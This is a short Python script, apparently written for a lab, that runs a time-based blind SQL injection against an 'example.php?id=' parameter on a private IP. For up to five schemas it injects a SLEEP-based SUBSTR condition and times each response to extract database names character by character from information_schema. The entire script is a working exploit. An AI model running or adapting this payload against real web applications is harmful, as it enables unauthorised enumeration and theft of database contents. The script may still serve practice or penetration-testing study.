#!/usr/bin/python3
from pwn import log
import string, requests, time

characters = string.ascii_lowercase + string.punctuation
bar = log.progress("Databases")

value = ""

for db in range(0,5):
    value += "\n\033[1;37m[\033[1;34m*\033[1;37m] "
    for position in range(0,20):
        for character in characters:
            tstr = time.time()
            requests.get(f"http://172.17.0.2/example.php?id=1'and if(substr((select schema_name from information_schema.schemata limit {db},1),{position},1)='{character}',sleep(2),1)-- -")
            tend = time.time()
            if (tend - tstr) > 2:
                value += character
                bar.status(value)
